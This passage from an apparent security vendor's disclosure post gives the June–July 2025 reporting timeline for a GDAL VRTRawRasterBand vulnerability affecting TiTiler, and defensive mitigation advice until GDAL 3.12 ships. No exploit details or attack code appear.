- **June 25, 2025**
To escalate communication, we created a [public GitHub issue in the TiTiler repository](https://github.com/developmentseed/titiler/issues/1180), requesting a direct security point of contact.

- **June 25, 2025**
On the same day, details that could lead to exploitation were unintentionally made public via a [related issue in the OSGeo/GDAL repository](https://github.com/OSGeo/gdal/issues/12645). This effectively made the vulnerability public knowledge.

- **June 26, 2025**
The TiTiler maintainers responded to the issue and closed it as “wontfix”, stating that the root cause originates from GDAL and noting that the behavior was already documented in the [GDAL security guidance](https://gdal.org/en/stable/user/security.html#gdal-vrt-driver) (as of September 19, 2024).

- **June 28, 2025**
A patch was proposed via [PR #12669 in the OSGeo/GDAL repository](https://github.com/OSGeo/gdal/pull/12669) to limit the functionality of `VRTRawRasterBand`, mitigating this class of vulnerabilities. This change is scheduled for inclusion in **GDAL version 3.12**.

- **July 2, 2025**
Additional documentation was merged to reflect updated security considerations associated with `VRTRawRasterBand`. See the [commit here](https://github.com/OSGeo/gdal/pull/12669/commits/c2694187851c511fc0829de716aee70c1adf28e6).


### Mitigation Guidance

Until GDAL 3.12 is released and widely adopted, we recommend the following precautions for projects using GDAL (including TiTiler):

- **Restrict public access**: Do **not** expose services relying on GDAL parsing (such as TiTiler) directly to the internet without authentication and proper access controls.
- **Limit input sources**: Avoid handling untrusted or user-controlled input that could be rendered as VRT or passed to VRT parsing components.
- **Monitor for updates**: Watch for the official GDAL 3.12 release and ensure your application upgrades as soon as it becomes available.

We appreciate the OSS maintainers for addressing issues that may intersect complex parsing behavior and system-level access, especially in widely-used geospatial tooling.

* * *

# Book a demo

Sign up

* * *

## Book a demo

### Find out more about our technology

Your work email addressYour full nameYour company name

By booking a demo, you agree to let us contact you with
announcements about our technology, and you certify that you are
over the age of 16.
